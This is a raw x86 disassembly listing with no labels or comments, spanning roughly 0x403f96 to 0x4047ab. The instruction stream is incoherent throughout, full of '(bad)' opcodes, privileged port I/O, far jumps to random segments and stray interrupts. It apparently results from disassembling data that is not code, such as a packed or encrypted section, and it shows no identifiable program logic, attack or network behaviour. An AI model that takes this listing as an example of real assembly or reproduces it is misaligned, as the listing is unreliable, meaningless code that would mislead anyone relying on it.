  403f96:	mov    ?,WORD PTR [ecx]
  403f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f99:	add    DWORD PTR [ebp*2-0x397c8397],edx
  403fa0:	push   0x367d6965
  403fa5:	cmc    
  403fa6:	jns    0x404010
  403fa8:	in     al,0x63
  403faa:	bound  ebx,QWORD PTR [eax+0x3be0d0f0]
  403fb0:	sub    ch,BYTE PTR [ecx]
  403fb2:	and    BYTE PTR [ecx+0x42],ah
  403fb5:	cmp    DWORD PTR [esi-0xf565081],ebp
  403fbb:	loopne 0x403f66
  403fbd:	lds    ebx,FWORD PTR [edi]
  403fbf:	mov    dh,0xdc
  403fc1:	mov    DWORD PTR [edx],ebp
  403fc3:	add    al,0x8a
  403fc5:	xchg   ebp,eax
  403fc6:	push   ebp
  403fc7:	push   esp
  403fc8:	into   
  403fc9:	inc    eax
  403fca:	and    bh,bl
  403fcc:	dec    edx
  403fcd:	sub    ebp,esi
  403fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fd0:	push   cs
  403fd1:	leave  
  403fd2:	outs   dx,BYTE PTR ds:[esi]
  403fd3:	imul   ecx,DWORD PTR [esi-0x5e3e3876],0x96b90b1f
  403fdd:	jmp    0x403f9a
  403fdf:	xchg   esi,eax
  403fe0:	test   DWORD PTR [esi+0x7747ffdb],edi
  403fe6:	sbb    BYTE PTR [eax],ch
  403fe8:	test   BYTE PTR [edx+0x2cfe0b69],0xe5
  403fef:	stc    
  403ff0:	ins    BYTE PTR es:[edi],dx
  403ff1:	mov    bl,0x6b
  403ff3:	loopne 0x404000
  403ff5:	test   al,0x3b
  403ff7:	adc    BYTE PTR [esi+ecx*1-0x7d2c9cc3],cl
  403ffe:	mov    dl,0x78
  404000:	xor    ecx,edi
  404002:	jae    0x404062
  404004:	adc    al,BYTE PTR [esi]
  404006:	stc    
  404007:	sub    BYTE PTR [edx-0x51],0x56
  40400b:	lahf   
  40400c:	out    0x6c,al
  40400e:	fidiv  WORD PTR [ebx-0x17ab3731]
  404014:	cld    
  404015:	gs pop ds
  404017:	push   edx
  404018:	lds    edx,FWORD PTR [edx+0x64]
  40401b:	mov    ds:0xb9d999c5,al
  404020:	js     0x40407b
  404022:	jnp    0x40402c
  404024:	or     eax,DWORD PTR [edi]
  404026:	pop    ebx
  404027:	mov    dl,0x99
  404029:	std    
  40402a:	jmp    0x184d:0xee533e2c
  404031:	inc    esi
  404032:	in     al,0xd0
  404034:	ds (bad) 
  404036:	adc    al,BYTE PTR [esi+0x67]
  404039:	loop   0x404045
  40403b:	pop    ebp
  40403c:	arpl   WORD PTR [esi-0x74db1b23],bx
  404042:	jno    0x4040ac
  404044:	outs   dx,DWORD PTR ds:[esi]
  404045:	call   0x2de7:0x6293d85e
  40404c:	les    ebp,FWORD PTR [esi-0x12]
  40404f:	mov    edi,0xbd3308cc
  404054:	imul   esp,DWORD PTR [edi+0x5bde92b5]
  40405b:	mov    bh,0x56
  40405d:	adc    ch,ah
  40405f:	call   0xfd296b0e
  404064:	cli    
  404065:	pop    edi
  404066:	outs   dx,DWORD PTR ds:[esi]
  404067:	inc    ebx
  404068:	pusha  
  404069:	pop    ebp
  40406a:	push   0x6c092b8b
  40406f:	pusha  
  404070:	hlt    
  404071:	mov    ebp,0xe34f92f3
  404076:	cdq    
  404077:	icebp  
  404078:	fist   DWORD PTR [esi+edi*2-0x75]
  40407c:	push   ss
  40407d:	into   
  40407e:	and    eax,0xb65c4512
  404083:	cmp    eax,0xd9b9eea1
  404088:	push   0x9bae26fb
  40408d:	adc    dh,BYTE PTR [edx-0x46d285bb]
  404093:	and    ebp,esi
  404095:	inc    edx
  404096:	adc    ch,al
  404098:	fwait
  404099:	in     al,0x48
  40409b:	mov    BYTE PTR [esi-0x664f6982],cl
  4040a1:	repz bound ebp,QWORD PTR [edi-0x33]
  4040a5:	or     esi,DWORD PTR [esi]
  4040a7:	stos   DWORD PTR es:[di],eax
  4040a9:	or     eax,0x7315750d
  4040ae:	mov    ecx,0x6021f100
  4040b3:	jae    0x404065
  4040b5:	or     edx,ebx
  4040b7:	or     BYTE PTR [ebx+0x2d],cl
  4040ba:	sub    eax,DWORD PTR [ecx-0x3d]
  4040bd:	push   0xcdfe83f4
  4040c2:	(bad)  
  4040c3:	mov    esp,0x39c6091d
  4040c8:	dec    edx
  4040c9:	cwde   
  4040ca:	scas   eax,DWORD PTR es:[edi]
  4040cb:	adc    DWORD PTR [edi+0x7f],ebx
  4040ce:	push   ss
  4040cf:	in     eax,0xe7
  4040d1:	ret    0x7d09
  4040d4:	ins    DWORD PTR es:[edi],dx
  4040d5:	adc    BYTE PTR [eax+0xa132d04],ah
  4040db:	xchg   ebp,eax
  4040dc:	test   al,0x14
  4040de:	aas    
  4040df:	add    DWORD PTR [ebx+0x49a82413],esi
  4040e5:	add    BYTE PTR [esi-0x61f245a2],al
  4040eb:	xchg   ebx,eax
  4040ec:	fbstp  TBYTE PTR [edi-0xc]
  4040ef:	fcmovne st,st(0)
  4040f1:	pop    esi
  4040f2:	xchg   ebp,eax
  4040f3:	aam    0xf1
  4040f5:	test   BYTE PTR [ecx],ch
  4040f7:	dec    edx
  4040f8:	test   DWORD PTR [esi+0x32],ebx
  4040fb:	fldcw  WORD PTR [ebx]
  4040fd:	adc    DWORD PTR [ebx+ecx*2-0x16],esi
  404101:	jmp    0x97a397bc
  404106:	adc    BYTE PTR [ebx-0x797bf38a],al
  40410c:	hlt    
  40410d:	or     al,0x0
  40410f:	push   ds
  404110:	into   
  404111:	gs call 0x4d47740
  404117:	stc    
  404118:	neg    DWORD PTR [esi+0x149bf4d0]
  40411e:	bound  ebp,QWORD PTR [esi+0x43]
  404121:	mov    ebx,0x3d12148f
  404126:	fisttp QWORD PTR [ebx-0x7c]
  404129:	add    eax,0x24b7792c
  40412e:	push   cs
  40412f:	es loop 0x404164
  404132:	xchg   edx,eax
  404133:	push   0x68f55d91
  404138:	xchg   edi,eax
  404139:	cmp    al,0x34
  40413b:	jmp    0x4040cc
  40413d:	fidivr WORD PTR [ebx-0x540218ac]
  404143:	imul   esi,DWORD PTR [esi-0x31],0x25994553
  40414a:	sub    eax,0x5ed7793c
  40414f:	out    dx,al
  404150:	xor    ch,BYTE PTR [eax]
  404152:	ja     0x404118
  404154:	test   BYTE PTR [edx+edx*1],dl
  404157:	(bad)  
  404158:	jp     0x404171
  40415a:	aaa    
  40415b:	dec    esi
  40415c:	sbb    BYTE PTR [eax-0x1f],dh
  40415f:	es pusha 
  404161:	sbb    BYTE PTR [ecx+0x7f67d63f],dh
  404167:	sbb    esp,ebx
  404169:	imul   ecx,DWORD PTR [eax],0xcda6e24e
  40416f:	xchg   BYTE PTR [esi+0x3b],bh
  404172:	and    esp,DWORD PTR [ecx-0x7dcadbae]
  404178:	jns    0x40417a
  40417a:	sub    cl,BYTE PTR [edx-0x6f770e57]
  404180:	arpl   WORD PTR [ebx+0x59],si
  404183:	es xor dl,bh
  404186:	jno    0x404173
  404188:	push   eax
  404189:	cmp    ch,ch
  40418b:	fistp  DWORD PTR [edx+ebp*1]
  40418e:	mov    ah,0x50
  404190:	fwait
  404191:	icebp  
  404192:	xor    eax,DWORD PTR [ecx]
  404194:	inc    edx
  404195:	add    al,0x15
  404197:	or     DWORD PTR [eax-0x592bc6e2],edx
  40419d:	fnstsw WORD PTR [ecx]
  40419f:	dec    esp
  4041a0:	shl    dh,1
  4041a2:	adc    eax,0x85922ddf
  4041a7:	into   
  4041a8:	and    eax,0x2e6229e0
  4041ad:	jle    0x404156
  4041af:	pop    es
  4041b0:	loope  0x4041dc
  4041b2:	mov    cl,0x4
  4041b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041b5:	scas   eax,DWORD PTR es:[edi]
  4041b6:	inc    esi
  4041b7:	aad    0x3e
  4041b9:	stos   BYTE PTR es:[edi],al
  4041ba:	jle    0x4041c3
  4041bc:	int    0x58
  4041be:	jge    0x4041dd
  4041c0:	sub    eax,0x7ecd7d5e
  4041c5:	cli    
  4041c6:	cmova  esp,DWORD PTR [esi+0x284293ec]
  4041cd:	mov    ecx,0x571fa938
  4041d2:	mov    ecx,0x3b6161da
  4041d7:	push   esi
  4041d8:	stos   DWORD PTR es:[edi],eax
  4041d9:	xchg   bl,bh
  4041db:	cdq    
  4041dc:	pop    ds
  4041dd:	pop    edx
  4041de:	mov    dl,0x9a
  4041e0:	fwait
  4041e1:	(bad)
  4041e4:	sub    al,0xe7
  4041e6:	lsl    edi,WORD PTR [edi+0x332d7c5f]
  4041ed:	test   BYTE PTR [eax-0x3f],cl
  4041f0:	xor    eax,0xe71d20d2
  4041f5:	fst    DWORD PTR [edx]
  4041f7:	out    0xeb,al
  4041f9:	and    eax,0x9f5f0239
  4041fe:	jae    0x40423e
  404200:	mov    esi,0x88b1d449
  404205:	mov    dh,0x1e
  404207:	xor    ebp,esi
  404209:	pop    eax
  40420a:	call   0x167dbea1
  40420f:	pop    ecx
  404210:	pushf  
  404211:	in     eax,0xe0
  404213:	jp     0x4041d3
  404215:	add    eax,0x2063d13e
  40421a:	jnp    0x404298
  40421c:	push   cs
  40421d:	dec    edx
  40421e:	nop
  40421f:	mov    al,0xe0
  404221:	int3   
  404222:	lock sub al,0x24
  404225:	and    eax,0x5c8d1e54
  40422a:	mov    eax,0x765dbe73
  40422f:	sub    ebx,DWORD PTR [ebx]
  404231:	mov    ah,0xdc
  404233:	call   0x6fb9:0x6d68cd26
  40423a:	mov    edx,0xf776d651
  40423f:	arpl   WORD PTR [ebp+0x4e542859],bp
  404245:	retf   0x3fb5
  404248:	out    0xa7,al
  40424a:	repnz adc BYTE PTR [esi-0x5403c4a8],bl
  404251:	sub    al,0xcd
  404253:	fcmovbe st,st(7)
  404255:	inc    ebx
  404256:	push   eax
  404257:	sub    BYTE PTR [edi+0x57],dl
  40425a:	mov    ds:0xc23c7548,al
  40425f:	jg     0x404260
  404261:	dec    ebx
  404262:	mov    dl,0x4c
  404264:	aad    0xff
  404266:	lds    edx,FWORD PTR [esi+ebp*1]
  404269:	xchg   ebp,eax
  40426a:	inc    edi
  40426b:	mov    dh,ah
  40426d:	(bad)  
  40426e:	mov    al,ds:0xf253ab0c
  404273:	mov    DWORD PTR [edi+0x1b],eax
  404276:	xor    eax,0xef8a7c04
  40427b:	ja     0x404292
  40427d:	xor    ah,bl
  40427f:	je     0x404238
  404281:	cmc    
  404282:	adc    eax,0xd3fd25a3
  404287:	gs cli 
  404289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40428a:	dec    ebp
  40428b:	sub    eax,0x2633edc1
  404290:	adc    al,0xe5
  404292:	cld    
  404293:	(bad)
  404296:	dec    ebx
  404297:	lods   al,BYTE PTR ds:[esi]
  404298:	jmp    0x23f70fa7
  40429d:	fldenv [eax-0x1b]
  4042a0:	mov    dh,0xca
  4042a2:	mov    cl,0x18
  4042a4:	scas   eax,DWORD PTR es:[edi]
  4042a5:	jecxz  0x4042df
  4042a7:	in     al,dx
  4042a8:	inc    eax
  4042a9:	scas   eax,DWORD PTR es:[edi]
  4042aa:	add    BYTE PTR [ecx-0x337c5d08],0xb7
  4042b1:	loope  0x4042c3
  4042b3:	cs mov bh,0x9f
  4042b6:	adc    BYTE PTR [esi-0x3e],0x7f
  4042ba:	and    dh,BYTE PTR [esi]
  4042bc:	xchg   ebp,eax
  4042bd:	xchg   ebp,ebx
  4042bf:	stc    
  4042c0:	xor    ch,BYTE PTR [edi+0x18806b15]
  4042c6:	ret    
  4042c7:	push   ecx
  4042c8:	(bad)  
  4042c9:	cmc    
  4042ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042cb:	aaa    
  4042cc:	(bad)  
  4042cd:	or     ebp,edx
  4042cf:	dec    ecx
  4042d0:	dec    esp
  4042d1:	inc    ecx
  4042d2:	add    ecx,DWORD PTR [edx-0x8860c76]
  4042d8:	aam    0x13
  4042da:	ins    DWORD PTR es:[edi],dx
  4042db:	adc    edx,edx
  4042dd:	push   esp
  4042de:	out    dx,eax
  4042df:	jne    0x40435a
  4042e1:	or     esp,ecx
  4042e3:	retf   
  4042e4:	retf   
  4042e5:	cli    
  4042e6:	mov    bh,0x79
  4042e8:	push   eax
  4042e9:	aam    0x9d
  4042eb:	xchg   ebp,eax
  4042ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042ed:	js     0x404290
  4042ef:	js     0x404299
  4042f1:	test   al,0x5
  4042f3:	or     ecx,DWORD PTR [edi+eax*2-0x4b]
  4042f7:	push   cs
  4042f8:	popf   
  4042f9:	pop    edi
  4042fa:	mov    dh,0xe8
  4042fc:	inc    edx
  4042fd:	inc    ebp
  4042fe:	xor    BYTE PTR [ebx+edi*1],0x50
  404302:	or     al,0x8b
  404304:	jmp    0x1e40:0xfcad7b19
  40430b:	inc    ecx
  40430c:	leave  
  40430d:	lds    edi,FWORD PTR [edi-0x1b]
  404310:	jb     0x4042ef
  404312:	xchg   ebx,eax
  404313:	push   0xffffff8d
  404315:	fdiv   DWORD PTR [ecx+0xd67c2ba]
  40431b:	sbb    bl,ah
  40431d:	in     al,dx
  40431e:	add    eax,0x9eb5224e
  404323:	jmp    0xc668:0x8cc6cc89
  40432a:	push   ebp
  40432b:	shl    ah,cl
  40432d:	ins    BYTE PTR es:[edi],dx
  40432e:	jmp    0x404316
  404330:	xchg   esi,eax
  404331:	pop    ss
  404332:	hlt    
  404333:	ja     0x80079ade
  404339:	mov    ah,0xf1
  40433b:	add    eax,0x509a8a9f
  404340:	dec    ebx
  404341:	popa   
  404342:	inc    esp
  404343:	outs   dx,BYTE PTR ds:[esi]
  404344:	fild   DWORD PTR [esi]
  404346:	adc    eax,DWORD PTR [ecx-0x404fe3d5]
  40434c:	cmp    ecx,ecx
  40434e:	pop    ss
  40434f:	adc    BYTE PTR [eax+0x355205c5],bl
  404355:	repz push eax
  404357:	mov    dl,0xee
  404359:	cmp    eax,0xcac3d2a2
  40435e:	shl    DWORD PTR [ecx+edi*2],1
  404361:	int    0xc7
  404363:	mov    esi,ecx
  404365:	xchg   esp,eax
  404366:	cwde   
  404367:	pop    esi
  404368:	test   eax,0x72d844d0
  40436d:	int    0x68
  40436f:	test   al,0xd9
  404371:	in     eax,dx
  404372:	sub    ebp,edi
  404374:	cld    
  404375:	pushf  
  404376:	jbe    0x40439a
  404378:	adc    eax,0xb95b1da4
  40437d:	dec    ecx
  40437e:	jo     0x4043bb
  404380:	stos   BYTE PTR es:[edi],al
  404381:	or     eax,0xa6cf60d6
  404386:	repnz rcl DWORD PTR [ebx-0x30],0x31
  40438b:	mul    dh
  40438d:	push   cs
  40438e:	pop    ds
  40438f:	xchg   edx,eax
  404390:	jmp    0xeaa4:0xcacafb3
  404397:	pop    ss
  404398:	jo     0x404330
  40439a:	ret    0xfb64
  40439d:	icebp  
  40439e:	pop    ebx
  40439f:	cmp    ebp,DWORD PTR [ecx-0x62]
  4043a2:	test   eax,0x571663ca
  4043a7:	push   ds
  4043a8:	in     al,dx
  4043a9:	inc    esi
  4043aa:	enter  0xf383,0xe4
  4043ae:	out    dx,eax
  4043af:	pushf  
  4043b0:	cmc    
  4043b1:	pop    ecx
  4043b2:	inc    edx
  4043b3:	outs   dx,BYTE PTR ds:[esi]
  4043b4:	xor    DWORD PTR ds:0x1d414331,ecx
  4043ba:	(bad)  
  4043bc:	pop    ecx
  4043bd:	fwait
  4043be:	das    
  4043bf:	cmp    dl,BYTE PTR [eax]
  4043c1:	mov    gs,WORD PTR [edi+0xefbf26c]
  4043c7:	push   edi
  4043c8:	imul   esi,DWORD PTR [edx+esi*2],0x462ef232
  4043cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043d0:	out    0xfc,al
  4043d2:	and    edx,DWORD PTR [esi+0x34a395f3]
  4043d8:	mov    bl,0x95
  4043da:	mov    ecx,0xfa706459
  4043df:	pop    ds
  4043e0:	push   ss
  4043e1:	and    BYTE PTR [ecx],ah
  4043e3:	or     ah,BYTE PTR [ebp-0x11b00622]
  4043e9:	pop    esp
  4043ea:	stos   BYTE PTR es:[edi],al
  4043eb:	inc    ecx
  4043ec:	sti    
  4043ed:	xor    al,0x57
  4043ef:	cs adc eax,0x49b7c3e7
  4043f5:	ss imul ebp,DWORD PTR es:[ecx-0xa],0x9e1f06ab
  4043fe:	inc    edi
  4043ff:	push   ecx
  404400:	fisttp QWORD PTR [eax]
  404402:	pushf  
  404403:	popf   
  404404:	adc    eax,0xabce0174
  404409:	lock jae 0x4043a6
  40440c:	js     0x4043da
  40440e:	sub    DWORD PTR [ebx-0x52e5c93f],esp
  404414:	ror    DWORD PTR [ecx+0x13988687],0x47
  40441b:	out    0x6f,eax
  40441d:	xchg   dh,al
  40441f:	out    0x5e,eax
  404421:	xor    ebp,eax
  404423:	adc    BYTE PTR [edi+0x717a1fd9],ch
  404429:	fdivr  QWORD PTR [edi+eax*8-0x10bd96d0]
  404430:	scas   al,BYTE PTR es:[edi]
  404431:	or     ebx,DWORD PTR [edx+0x1f]
  404434:	sti    
  404435:	xor    BYTE PTR [edi+edi*1-0x2cefa0f7],bh
  40443c:	adc    DWORD PTR [eax-0x76],0x4cdfd7ef
  404443:	call   0x7bff:0x20988ae6
  40444a:	lahf   
  40444b:	ret    0xebb0
  40444e:	inc    edx
  40444f:	mov    edi,0x901421ed
  404454:	idiv   ch
  404456:	outs   dx,DWORD PTR ds:[esi]
  404457:	out    dx,al
  404458:	push   esi
  404459:	jno    0x4044a1
  40445b:	mov    esp,0x96086a69
  404460:	sbb    esi,DWORD PTR [edx+0x27]
  404463:	jl     0x404485
  404465:	jno    0x4044dd
  404467:	mov    ch,BYTE PTR [ecx+0x3f]
  40446a:	mov    BYTE PTR [edx+0x1c],bh
  40446d:	(bad)  
  40446e:	mov    ecx,0x511b8250
  404473:	cmp    BYTE PTR [edx+0xd3dd75e],bl
  404479:	int    0x77
  40447b:	xor    DWORD PTR [eax-0x50],esp
  40447e:	test   eax,0x92968b87
  404483:	cmp    DWORD PTR [esi],ebp
  404485:	jo     0x404421
  404487:	xchg   ah,ah
  404489:	cld    
  40448a:	cmp    al,0xf
  40448c:	dec    edx
  40448d:	in     eax,0x55
  40448f:	dec    edi
  404490:	pop    ecx
  404491:	or     eax,0x7b651af0
  404496:	arpl   WORD PTR [edi],ax
  404498:	xchg   ebx,eax
  404499:	mul    DWORD PTR [ebx]
  40449b:	es sub ah,ah
  40449e:	push   cs
  40449f:	ss loop 0x4044aa
  4044a2:	(bad)  
  4044a3:	inc    BYTE PTR [ecx]
  4044a5:	jo     0x404441
  4044a7:	bound  ebp,QWORD PTR [eax+0x2fd69c3a]
  4044ad:	repz arpl WORD PTR [ebx-0x5f212b2],dx
  4044b4:	sub    dh,BYTE PTR [ebx-0x49419546]
  4044ba:	xchg   ebp,eax
  4044bb:	hlt    
  4044bc:	leave  
  4044bd:	pop    edx
  4044be:	dec    esp
  4044bf:	(bad)  
  4044c0:	aam    0x2
  4044c2:	jle    0x4044f5
  4044c4:	lock sbb BYTE PTR [edx+0x43],dl
  4044c8:	es out 0x36,eax
  4044cb:	stc    
  4044cc:	aam    0xfd
  4044ce:	sub    DWORD PTR [esp+edi*4+0x62d45f5d],0x43
  4044d6:	or     ch,ah
  4044d8:	arpl   WORD PTR [edx+0x15248b35],di
  4044de:	jmp    DWORD PTR [eax-0x2bba6bf2]
  4044e4:	test   BYTE PTR [ebp-0x390fc83a],cl
  4044ea:	add    al,0x90
  4044ec:	or     dh,dh
  4044ee:	hlt    
  4044ef:	lds    edi,FWORD PTR [ecx-0x2fffdd22]
  4044f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044f6:	sub    eax,0xb7667c13
  4044fb:	mov    WORD PTR [ebx],?
  4044fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044fe:	sbb    eax,0x8b8d034b
  404503:	cld    
  404504:	and    al,0xdb
  404506:	push   ecx
  404507:	mov    dl,cl
  404509:	test   BYTE PTR [edi+ecx*8],cl
  40450c:	push   eax
  40450d:	or     ah,BYTE PTR [eax]
  40450f:	xchg   esp,eax
  404510:	arpl   ax,bp
  404512:	sub    bh,dh
  404514:	loop   0x404535
  404516:	push   ebp
  404517:	mov    ah,0xc4
  404519:	pop    ebx
  40451a:	jmp    0x40455e
  40451c:	rcr    BYTE PTR ds:0x2fdef123,1
  404522:	push   edi
  404523:	retf   0xe437
  404526:	sbb    al,0x8d
  404528:	push   esi
  404529:	js     0x4044d7
  40452b:	inc    eax
  40452c:	out    0x1c,eax
  40452e:	(bad)  
  40452f:	mov    al,ds:0xce012679
  404534:	mov    cl,0x13
  404536:	fldenv [si]
  404539:	rcl    bh,1
  40453b:	push   ebp
  40453c:	jg     0x404519
  40453e:	sti    
  40453f:	iret   
  404540:	push   ecx
  404541:	mov    bl,0x81
  404543:	icebp  
  404544:	jns    0x4044ea
  404546:	aas    
  404547:	setp   BYTE PTR [eax+0x79]
  40454b:	sbb    edx,ebp
  40454d:	scas   eax,DWORD PTR es:[edi]
  40454e:	ror    bl,cl
  404550:	in     eax,0x59
  404552:	stos   BYTE PTR es:[edi],al
  404553:	and    ebp,ecx
  404555:	push   0xffffff87
  404557:	xchg   esi,eax
  404558:	jle    0x4044ee
  40455a:	mul    DWORD PTR [edi+0x31be6a2b]
  404560:	push   ds
  404561:	repz add DWORD PTR [esi+0x2626ebbf],0xf8816f60
  40456c:	test   cl,bl
  40456e:	sub    eax,0x53ecb42
  404573:	addr16 inc ebp
  404575:	mov    al,0x62
  404577:	ror    dl,0x66
  40457a:	push   ss
  40457b:	cld    
  40457c:	mov    edi,0x74772dc5
  404581:	jb     0x404517
  404583:	mov    dl,0x47
  404585:	push   ebx
  404586:	sahf   
  404587:	xchg   esp,eax
  404588:	xor    BYTE PTR [edx],dl
  40458a:	mov    edi,0xb261bc1
  40458f:	psubusw mm7,QWORD PTR [edx]
  404592:	inc    esp
  404593:	cmp    ebp,eax
  404595:	cwde   
  404596:	je     0x4045d3
  404598:	xor    al,BYTE PTR [ecx+0x4]
  40459b:	mov    bh,0x69
  40459d:	jmp    0xe8dc:0x9bb8b859
  4045a4:	jge    0x4045b0
  4045a6:	inc    edx
  4045a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045a8:	pop    esp
  4045a9:	sub    dl,ah
  4045ab:	dec    esi
  4045ac:	leave  
  4045ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045ae:	mov    ebp,0x33761ccf
  4045b3:	xchg   esi,eax
  4045b4:	pop    ebp
  4045b5:	loopne 0x404582
  4045b7:	cmp    al,0x3c
  4045b9:	pop    esp
  4045ba:	mov    ecx,0xadf7c003
  4045bf:	push   cs
  4045c0:	fimul  DWORD PTR [ebx+0x41ed835b]
  4045c6:	das    
  4045c7:	fist   WORD PTR [ecx-0x2c]
  4045ca:	js     0x40462a
  4045cc:	out    dx,eax
  4045cd:	in     eax,0x73
  4045cf:	nop
  4045d0:	and    ebp,DWORD PTR [edi+0x6f]
  4045d3:	and    al,0x60
  4045d5:	mul    al
  4045d7:	mov    WORD PTR [ecx+0x4b],fs
  4045da:	and    DWORD PTR [ebp+0x7b],ebx
  4045dd:	inc    ecx
  4045de:	dec    ebp
  4045df:	pop    edi
  4045e0:	loopne 0x4045f3
  4045e2:	loopne 0x40464d
  4045e4:	bound  ebx,QWORD PTR [ebx+0x499989e8]
  4045ea:	imul   ecx,DWORD PTR [edi],0x2dc781e7
  4045f0:	xor    esp,DWORD PTR [edi-0x15065934]
  4045f6:	sub    dh,cl
  4045f8:	and    al,0xd2
  4045fa:	es jp  0x404617
  4045fd:	rcr    DWORD PTR [eax],1
  4045ff:	sbb    eax,0x5325007b
  404604:	pop    esp
  404605:	fstp   DWORD PTR [eax-0x31]
  404608:	add    al,0xdb
  40460a:	push   ebx
  40460b:	mov    eax,0x4b0b34a6
  404610:	retf   
  404611:	mov    al,ds:0x4931344c
  404616:	std    
  404617:	mov    al,ds:0x4c22207
  40461c:	jecxz  0x40467a
  40461e:	and    DWORD PTR [edx+eiz*4],ebx
  404621:	inc    ecx
  404622:	adc    BYTE PTR cs:0xa53ebb15,bh
  404629:	adc    eax,DWORD PTR [edx+0x40]
  40462c:	jne    0x404626
  40462e:	sbb    DWORD PTR [edi],0xffffffd3
  404631:	push   0xffffffee
  404633:	call   0xe8ec50f5
  404638:	push   esp
  404639:	jo     0x4045d7
  40463b:	stc    
  40463c:	jno    0x40460b
  40463e:	mov    dl,0xae
  404640:	or     al,0xab
  404642:	cmc    
  404643:	jle    0x404600
  404645:	xlat   BYTE PTR ds:[ebx]
  404646:	mov    es:0x98276ba6,eax
  40464c:	add    DWORD PTR [edi+0x45],ebx
  40464f:	push   ebx
  404650:	mov    esi,0xb86d8f62
  404655:	and    eax,0x219f9bae
  40465a:	cmp    eax,0x8cc715b9
  40465f:	lds    ebp,FWORD PTR [edi+ecx*8+0x66c90307]
  404666:	scas   al,BYTE PTR es:[edi]
  404667:	dec    BYTE PTR [ebx+ecx*8]
  40466a:	ret    0xe7f1
  40466d:	sbb    DWORD PTR [ebx+ecx*4+0x492b3018],esp
  404674:	ja     0x4046d5
  404676:	arpl   WORD PTR [ecx],sp
  404678:	jp     0x4046e9
  40467a:	jo     0x40463e
  40467c:	or     bl,dh
  40467e:	xchg   DWORD PTR [edi+0x72f93ab1],ebx
  404684:	xor    BYTE PTR [eax-0x53],ch
  404687:	xor    al,0xc5
  404689:	adc    ecx,DWORD PTR [esi-0x62]
  40468c:	xchg   ebp,eax
  40468d:	ja     0x40461f
  40468f:	outs   dx,BYTE PTR ds:[esi]
  404690:	(bad)  
  404691:	jns    0x40466a
  404693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404694:	mov    ds:0xe89d043e,al
  404699:	mov    BYTE PTR [ecx-0x61],al
  40469c:	dec    ebx
  40469d:	les    esp,FWORD PTR [esi+0x65]
  4046a0:	outs   dx,DWORD PTR ds:[esi]
  4046a1:	fidivr DWORD PTR [ebx]
  4046a3:	jne    0x4046ec
  4046a5:	movhps QWORD PTR [edx],xmm7
  4046a8:	nop
  4046a9:	and    si,WORD PTR [ebp-0x40]
  4046ad:	sub    dh,BYTE PTR [esi+0x2b]
  4046b0:	xlat   BYTE PTR ds:[ebx]
  4046b1:	cdq    
  4046b2:	push   0xca3658d7
  4046b7:	in     eax,dx
  4046b8:	mov    esp,0x12e35886
  4046bd:	in     eax,0x73
  4046bf:	and    ah,bh
  4046c1:	out    0xf6,al
  4046c3:	dec    ecx
  4046c4:	aad    0x89
  4046c6:	mov    DWORD PTR [ecx-0x8],ebp
  4046c9:	xchg   edx,ebx
  4046cb:	retf   0xde9d
  4046ce:	or     eax,0xda05aa8a
  4046d3:	(bad)  
  4046d4:	jb     0x4046a8
  4046d6:	retf   0xf821
  4046d9:	in     eax,dx
  4046da:	add    ah,dh
  4046dc:	jae    0x4046eb
  4046de:	or     bh,bh
  4046e0:	(bad)  
  4046e1:	aam    0xb8
  4046e3:	in     al,0x3
  4046e5:	fidiv  DWORD PTR [edi+0x30934f5]
  4046eb:	inc    ebp
  4046ec:	xchg   edx,eax
  4046ed:	ins    BYTE PTR es:[edi],dx
  4046ee:	mov    BYTE PTR [eax+0x6af7f450],ch
  4046f4:	(bad)  
  4046f5:	jecxz  0x404754
  4046f7:	mov    dh,0x88
  4046f9:	sbb    BYTE PTR [eax-0x1b],dh
  4046fc:	rcr    BYTE PTR [ebx-0xb],cl
  4046ff:	aad    0x33
  404701:	icebp  
  404702:	xchg   ecx,eax
  404703:	mov    esp,0x5d276a54
  404708:	push   DWORD PTR [ecx+0x2fba626f]
  40470e:	or     DWORD PTR [ebx],ecx
  404710:	adc    DWORD PTR [ebx+0x72],ebp
  404713:	cli    
  404714:	(bad)  
  404715:	fnsave [eax-0x2f2da00c]
  40471b:	jmp    0x2592b0d9
  404720:	loope  0x40470d
  404722:	pop    ebp
  404723:	mov    ecx,0xd0a7aaf1
  404728:	sub    DWORD PTR [edi+0x2ff0b657],ebx
  40472e:	ror    al,cl
  404730:	int    0x83
  404732:	test   eax,0x9308fb07
  404737:	adc    ch,dl
  404739:	xchg   edx,eax
  40473a:	or     BYTE PTR [ebx-0x62],bh
  40473d:	and    eax,0xf20341d
  404742:	mov    ch,0x1d
  404744:	or     eax,0x6400087c
  404749:	les    ebp,FWORD PTR [esi+esi*1+0xe2207e9]
  404750:	es loope 0x404709
  404753:	test   BYTE PTR [ebx-0x68],ah
  404756:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  404758:	pop    eax
  404759:	loopne 0x4047b7
  40475b:	or     eax,0x55a1f6f3
  404761:	and    DWORD PTR [ecx],0x20
  404764:	call   0xa7921ad7
  404769:	mov    bh,0xca
  40476b:	sbb    ecx,edi
  40476d:	(bad)  
  40476e:	push   0x8
  404770:	mov    edx,0xcd77ab62
  404775:	cdq    
  404776:	adc    ch,0x51
  404779:	xchg   edx,eax
  40477a:	mov    gs,WORD PTR ds:0x33541d29
  404780:	or     eax,0xe52dd75e
  404785:	fst    QWORD PTR [esi+0x5af68da3]
  40478b:	add    al,0x3c
  40478d:	imul   eax,DWORD PTR [edx+0x52f85e4f],0xb1cbbe1a
  404797:	push   edi
  404798:	mov    ch,0xec
  40479a:	stos   DWORD PTR es:[edi],eax
  40479b:	cld    
  40479c:	call   0xcd2f0cfe
  4047a1:	push   esi
  4047a2:	scas   al,BYTE PTR es:[edi]
  4047a3:	xor    esp,DWORD PTR [edi]
  4047a5:	sbb    esp,DWORD PTR [edi-0x5b59c937]
  4047ab:	or     dl,BYTE PTR [edi-0x65]
